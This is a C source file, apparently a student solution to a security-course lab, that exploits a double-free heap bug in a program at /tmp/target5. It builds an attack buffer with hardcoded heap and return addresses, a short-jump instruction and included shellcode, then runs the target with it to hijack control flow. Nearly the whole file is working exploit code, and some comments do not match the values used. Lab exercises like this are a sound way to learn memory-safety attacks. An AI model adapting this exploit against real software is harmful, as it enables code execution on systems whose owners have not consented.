#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"
#define SIZE 1024
#define NOP 0x90

/* We want to create the chunk after and before q
 * such that while freeing second time, we can get
 * the eip to the shellcode.
 */ 
int main(void)
{
  char *args[3];
  char *env[1];

  long retAddr, bufAddr, jumpInstruction;

  char attack[SIZE];

  // Filling with 1. This is done so that everything seems free.
  memset(attack, 1, SIZE);

  retAddr = 0xbffffa8c; // $ebp + 4 or ret for the foo
  bufAddr = 0x08049bc8; // Starting of the buffer. This will point
                        //  to the jmp instruction.
  /*
   * Copying into the string.
   * Got the correct address after some debugging.
   * p is at 0x08049bc8 and q is at 0x8049d60.
   */

  memcpy(&attack[400], &bufAddr, 4);
  memcpy(&attack[404], &retAddr, 4);

  /*
   * 2 bytes long instrution.
   * eb: short jump.
   * 06: 6 bytes.
   * because, we need to jump 32 - 2 bytes above to reach the shellcode
   */
  jumpInstruction = 0xffff1eeb;
  memcpy(attack, &jumpInstruction, 2);

  /*
   * Adding shellcode to the attack string
   */ 
  memcpy(attack + 32, shellcode, strlen(shellcode));

  attack[SIZE - 1] = '\0';

  args[0] = TARGET; 
  args[1] = attack; 
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
